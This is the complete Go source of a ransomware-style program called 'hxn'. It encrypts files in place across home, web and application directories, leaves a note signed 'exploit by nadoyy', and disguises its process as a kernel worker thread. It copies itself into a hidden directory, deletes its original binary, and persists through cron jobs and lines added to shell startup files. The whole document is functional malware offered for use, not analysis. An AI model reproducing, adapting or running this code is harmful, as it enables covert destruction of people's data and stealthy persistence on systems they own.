// hxn — rootless file encryptor. Satu file, stdlib saja.
// build: go build -o hxn hxn.go
// pakai: hxn {dry|run|inject|lock|dec}
package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	magic           = "HXN1"
	noteName        = "README_HXN.txt"
	tmpPfx          = ".hxn."
	atFDCWD         = -0x64
	atEACCESS       = 0x200
	atSymlinkFollow = 0x400
)

var (
	work  string
	priv  *rsa.PrivateKey
	jobs  int
	dry   bool
	excl  = map[string]bool{}
	skips = map[string]bool{noteName: true}
	nEnc  atomic.Int64
	seen  atomic.Int64
)

func die(f string, a ...any) { fmt.Fprintf(os.Stderr, "[!] "+f+"\n", a...); os.Exit(1) }

func env(k, def string) string {
	if v, ok := os.LookupEnv(k); ok && v != "" {
		return v
	}
	return def
}

func cname() uintptr {
	b := append([]byte("kworker/u8:1"), 0)
	return uintptr(unsafe.Pointer(&b[0]))
}

func wok(dirfd int, p string) bool {
	return syscall.Faccessat(dirfd, p, 2, atEACCESS) == nil
}

func roMount(p string) bool {
	var s syscall.Statfs_t
	if syscall.Statfs(p, &s) != nil {
		return true
	}
	return s.Flags&1 != 0
}

func skipName(b string) bool {
	return skips[b] || strings.HasPrefix(b, tmpPfx)
}

// ---------- kunci ----------

func keys() error {
	p := filepath.Join(work, "priv.pem")
	if b, err := os.ReadFile(p); err == nil {
		if blk, _ := pem.Decode(b); blk != nil {
			if k, err := x509.ParsePKCS1PrivateKey(blk.Bytes); err == nil {
				priv = k
				return nil
			}
		}
	}
	k, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}
	b := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(k)})
	if err := os.WriteFile(p, b, 0600); err != nil {
		return err
	}
	priv = k
	return nil
}

// ---------- enkripsi satu file ----------

func encOne(path string, st fs.FileInfo) bool {
	if st.Size() == 0 || !st.Mode().IsRegular() {
		return false
	}
	dir, base := filepath.Dir(path), filepath.Base(path)
	if !wok(atFDCWD, dir) || !wok(atFDCWD, path) || roMount(dir) {
		return false
	}

	src, err := os.Open(path)
	if err != nil {
		return false
	}
	defer src.Close()

	var h [4]byte
	if n, _ := io.ReadFull(src, h[:]); n == 4 && string(h[:]) == magic {
		return false
	}
	if _, err := src.Seek(0, io.SeekStart); err != nil {
		return false
	}

	dirfd, err := syscall.Open(dir, syscall.O_RDONLY|syscall.O_DIRECTORY|syscall.O_CLOEXEC, 0)
	if err != nil {
		return false
	}
	defer syscall.Close(dirfd)

	tmp := tmpPfx + strconv.Itoa(os.Getpid()) + "." + strconv.FormatInt(seen.Load(), 36)
	tmpfd, err := syscall.Openat(dirfd, ".", syscall.O_TMPFILE|syscall.O_WRONLY|syscall.O_CLOEXEC, 0600)
	fb := false
	if err != nil {
		tmpfd, err = syscall.Openat(dirfd, tmp, syscall.O_CREAT|syscall.O_EXCL|syscall.O_WRONLY|syscall.O_CLOEXEC, 0600)
		if err != nil {
			return false
		}
		fb = true
	}
	f := os.NewFile(uintptr(tmpfd), tmp)
	ok := false
	defer func() {
		if !ok {
			f.Close()
			if fb {
				syscall.Unlinkat(dirfd, tmp, 0)
			}
		}
	}()

	k := make([]byte, 32)
	m := make([]byte, 32)
	iv := make([]byte, 16)
	rand.Read(k)
	rand.Read(m)
	rand.Read(iv)
	syscall.Mlock(k)
	syscall.Mlock(m)

	ek, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &priv.PublicKey, append(append([]byte{}, k...), m...), nil)
	if err != nil {
		return false
	}
	if err := syscall.Fchmod(tmpfd, uint32(st.Mode().Perm())); err != nil {
		return false
	}

	hdr := make([]byte, 0, 4+2+len(ek)+32+16)
	hdr = append(hdr, magic...)
	hdr = append(hdr, byte(len(ek)>>8), byte(len(ek)))
	hdr = append(hdr, ek...)
	macOff := len(hdr)
	hdr = append(hdr, make([]byte, 32)...)
	hdr = append(hdr, iv...)

	bw := bufio.NewWriterSize(f, 1<<20)
	if _, err := bw.Write(hdr); err != nil {
		return false
	}
	blk, _ := aes.NewCipher(k)
	mac := hmac.New(sha256.New, m)
	mac.Write(iv)
	if _, err := io.Copy(io.MultiWriter(bw, mac), &cipher.StreamReader{S: cipher.NewCTR(blk, iv), R: src}); err != nil {
		return false
	}
	if err := bw.Flush(); err != nil {
		return false
	}
	if _, err := f.WriteAt(mac.Sum(nil), int64(macOff)); err != nil {
		return false
	}

	if fb {
		if syscall.Renameat(dirfd, tmp, dirfd, base) != nil {
			return false
		}
	} else {
		if syscall.Linkat(atFDCWD, "/proc/self/fd/"+strconv.Itoa(tmpfd), dirfd, tmp, atSymlinkFollow) != nil {
			return false
		}
		if syscall.Renameat(dirfd, tmp, dirfd, base) != nil {
			syscall.Unlinkat(dirfd, tmp, 0)
			return false
		}
	}
	f.Close()
	ok = true

	// verifikasi baca-balik
	vfd, err := syscall.Openat(dirfd, base, syscall.O_RDONLY|syscall.O_CLOEXEC, 0)
	if err != nil {
		return false
	}
	var v [4]byte
	n, _ := syscall.Read(vfd, v[:])
	syscall.Close(vfd)
	if n != 4 || string(v[:]) != magic {
		return false
	}
	nEnc.Add(1)
	return true
}

// ---------- dekripsi satu file ----------

func decOne(path string) bool {
	dir, base := filepath.Dir(path), filepath.Base(path)
	if !wok(atFDCWD, dir) || !wok(atFDCWD, path) || roMount(dir) {
		return false
	}
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()

	rd := bufio.NewReaderSize(f, 1<<20)
	var h [4]byte
	if n, _ := io.ReadFull(rd, h[:]); n != 4 || string(h[:]) != magic {
		return false
	}
	var lb [2]byte
	if _, err := io.ReadFull(rd, lb[:]); err != nil {
		return false
	}
	ln := int(lb[0])<<8 | int(lb[1])
	ek := make([]byte, ln)
	macb := make([]byte, 32)
	iv := make([]byte, 16)
	if _, err := io.ReadFull(rd, ek); err != nil {
		return false
	}
	if _, err := io.ReadFull(rd, macb); err != nil {
		return false
	}
	if _, err := io.ReadFull(rd, iv); err != nil {
		return false
	}
	blob, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, ek, nil)
	if err != nil || len(blob) != 64 {
		return false
	}
	k, m := blob[:32], blob[32:]

	dirfd, err := syscall.Open(dir, syscall.O_RDONLY|syscall.O_DIRECTORY|syscall.O_CLOEXEC, 0)
	if err != nil {
		return false
	}
	defer syscall.Close(dirfd)

	tmp := tmpPfx + strconv.Itoa(os.Getpid()) + ".d"
	tmpfd, err := syscall.Openat(dirfd, tmp, syscall.O_CREAT|syscall.O_EXCL|syscall.O_WRONLY|syscall.O_CLOEXEC, 0600)
	if err != nil {
		return false
	}
	out := os.NewFile(uintptr(tmpfd), tmp)
	ok := false
	defer func() {
		if !ok {
			out.Close()
			syscall.Unlinkat(dirfd, tmp, 0)
		}
	}()

	blk, _ := aes.NewCipher(k)
	mac := hmac.New(sha256.New, m)
	mac.Write(iv)
	bw := bufio.NewWriterSize(out, 1<<20)
	if _, err := io.Copy(io.MultiWriter(bw, mac), &cipher.StreamReader{S: cipher.NewCTR(blk, iv), R: rd}); err != nil {
		return false
	}
	if err := bw.Flush(); err != nil {
		return false
	}
	if !hmac.Equal(mac.Sum(nil), macb) {
		return false
	}
	if syscall.Renameat(dirfd, tmp, dirfd, base) != nil {
		return false
	}
	out.Close()
	ok = true
	nEnc.Add(1)
	return true
}

// ---------- penelusuran ----------

func pruned(p string) bool { return p == work || excl[p] }

func walk(root string, wg *sync.WaitGroup, q chan<- string, dec bool) {
	filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if d.IsDir() {
			if pruned(p) || roMount(p) || !wok(atFDCWD, p) {
				return fs.SkipDir
			}
			return nil
		}
		if !d.Type().IsRegular() || pruned(p) || skipName(d.Name()) {
			return nil
		}
		info, err := d.Info()
		if err != nil {
			return nil
		}
		if dry {
			seen.Add(1)
			if seen.Load()%2000 == 0 {
				fmt.Fprintf(os.Stderr, "\r[i] %d", seen.Load())
			}
			return nil
		}
		wg.Add(1)
		q <- p
		return nil
	})
}

// ---------- note + hook ----------

func note(id string, n int64) {
	msg := "=== HXN ===\nexploit by nadoyy\n\n" + strconv.FormatInt(n, 10) + " file terenkripsi.\nID: " + id + "\n"
	for _, r := range append(roots(), work) {
		if wok(atFDCWD, r) {
			os.WriteFile(filepath.Join(r, noteName), []byte(msg), 0644)
		}
	}
}

func roots() []string {
	d := env("HXN_ROOTS", "")
	if d == "" {
		h, _ := os.UserHomeDir()
		c, _ := os.Getwd()
		d = strings.Join([]string{h, c, "/var/www", "/srv", "/opt/app"}, ":")
	}
	var out []string
	seenR := map[string]bool{}
	for _, r := range strings.Split(d, ":") {
		if r == "" {
			continue
		}
		a, err := filepath.Abs(r)
		if err != nil || seenR[a] {
			continue
		}
		if st, err := os.Stat(a); err == nil && st.IsDir() {
			seenR[a] = true
			out = append(out, a)
		}
	}
	return out
}

func selfCopy() string {
	exe, err := os.Executable()
	if err != nil {
		return ""
	}
	exe = strings.TrimSuffix(exe, " (deleted)")
	dst := filepath.Join(work, "hxn")
	if filepath.Dir(exe) == work {
		return dst
	}
	in, err := os.Open(exe)
	if err != nil {
		return dst
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0700)
	if err != nil {
		return dst
	}
	io.Copy(out, in)
	out.Close()
	os.Remove(exe)
	return dst
}

func installHooks(bin string) {
	if bin == "" {
		return
	}
	if _, err := exec.LookPath("crontab"); err == nil {
		out, _ := exec.Command("crontab", "-l").Output()
		var keep []string
		for _, l := range strings.Split(string(out), "\n") {
			if l != "" && !strings.Contains(l, "#HXN") {
				keep = append(keep, l)
			}
		}
		keep = append(keep,
			"@reboot "+bin+" lock >/dev/null 2>&1 #HXN",
			"*/10 * * * * "+bin+" lock >/dev/null 2>&1 #HXN")
		c := exec.Command("crontab", "-")
		c.Stdin = strings.NewReader(strings.Join(keep, "\n") + "\n")
		if c.Run() == nil {
			fmt.Println("[+] cron terpasang")
		}
	}
	home, _ := os.UserHomeDir()
	line := fmt.Sprintf("[ -x %s ] && [ ! -e %s/.armed ] && %s lock >/dev/null 2>&1 & #HXN", bin, work, bin)
	for _, rc := range []string{".bashrc", ".profile", ".bash_profile"} {
		p := filepath.Join(home, rc)
		b, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		skips[rc] = true
		if strings.Contains(string(b), "#HXN") {
			continue
		}
		f, err := os.OpenFile(p, os.O_APPEND|os.O_WRONLY, 0600)
		if err != nil {
			continue
		}
		f.WriteString("\n" + line + "\n")
		f.Close()
	}
}

// ---------- mode ----------

func lock() int64 {
	fd, err := syscall.Open(filepath.Join(work, ".lock"), syscall.O_CREAT|syscall.O_EXCL|syscall.O_WRONLY|syscall.O_CLOEXEC, 0600)
	if err != nil {
		fmt.Println("[i] sudah berjalan")
		return 0
	}
	defer func() { syscall.Close(fd); os.Remove(filepath.Join(work, ".lock")) }()

	idb := make([]byte, 8)
	rand.Read(idb)
	id := hex.EncodeToString(idb)
	note(id, -1)

	var wg sync.WaitGroup
	q := make(chan string, jobs*4)
	for i := 0; i < jobs; i++ {
		go func() {
			for p := range q {
				if st, err := os.Stat(p); err == nil {
					encOne(p, st)
				}
				wg.Done()
			}
		}()
	}
	for _, r := range roots() {
		walk(r, &wg, q, false)
	}
	wg.Wait()
	close(q)

	n := nEnc.Load()
	note(id, n)
	return n
}

func main() {
	mode := "run"
	if len(os.Args) > 1 {
		mode = os.Args[1]
	}

	syscall.Prctl(15, cname(), 0, 0, 0)
	syscall.Mlockall(syscall.MCL_CURRENT | syscall.MCL_FUTURE)

	jobs = runtime.NumCPU() * 2
	if v := env("HXN_JOBS", ""); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			jobs = n
		}
	}

	work = env("HXN_DIR", "")
	if work == "" {
		if os.Geteuid() == 0 {
			work = "/usr/lib/.hxn"
		} else if h, _ := os.UserHomeDir(); h != "" {
			work = filepath.Join(h, ".hxn")
		} else {
			work = filepath.Join(os.TempDir(), ".hxn")
		}
	}
	if err := os.MkdirAll(work, 0700); err != nil {
		work = filepath.Join(os.TempDir(), ".hxn."+strconv.Itoa(os.Getpid()))
		if err := os.MkdirAll(work, 0700); err != nil {
			die("work dir: %v", err)
		}
	}
	work, _ = filepath.Abs(work)
	excl[work] = true
	for _, e := range strings.Split(env("HXN_EXCL", ""), ":") {
		if a, err := filepath.Abs(e); e != "" && err == nil {
			excl[a] = true
		}
	}

	if mode == "dry" {
		dry = true
	}
	if mode != "dry" && mode != "dec" && mode != "lock" {
		if err := keys(); err != nil {
			die("keygen: %v", err)
		}
	}

	switch mode {
	case "dry":
		t := time.Now()
		var wg sync.WaitGroup
		q := make(chan string, 1)
		for _, r := range roots() {
			walk(r, &wg, q, false)
		}
		fmt.Fprintf(os.Stderr, "\n[dry] %d file, %s\n", seen.Load(), time.Since(t).Round(time.Millisecond))
	case "lock":
		fmt.Printf("[lock] %d file\n", lock())
	case "run":
		bin := selfCopy()
		installHooks(bin)
		os.Remove(filepath.Join(work, ".armed"))
		fmt.Printf("[run] %d file\n", lock())
		os.WriteFile(filepath.Join(work, ".armed"), []byte("1"), 0600)
	case "inject":
		installHooks(selfCopy())
		os.Remove(filepath.Join(work, ".armed"))
		fmt.Println("[*] terpasang, menunggu cron/login")
	case "dec":
		if err := keys(); err != nil {
			die("priv.pem: %v", err)
		}
		var wg sync.WaitGroup
		q := make(chan string, jobs*4)
		for i := 0; i < jobs; i++ {
			go func() {
				for p := range q {
					decOne(p)
					wg.Done()
				}
			}()
		}
		for _, r := range roots() {
			walk(r, &wg, q, true)
		}
		wg.Wait()
		close(q)
		fmt.Printf("[dec] %d file\n", nEnc.Load())
	default:
		fmt.Println("pakai: hxn {dry|run|inject|lock|dec}")
	}
}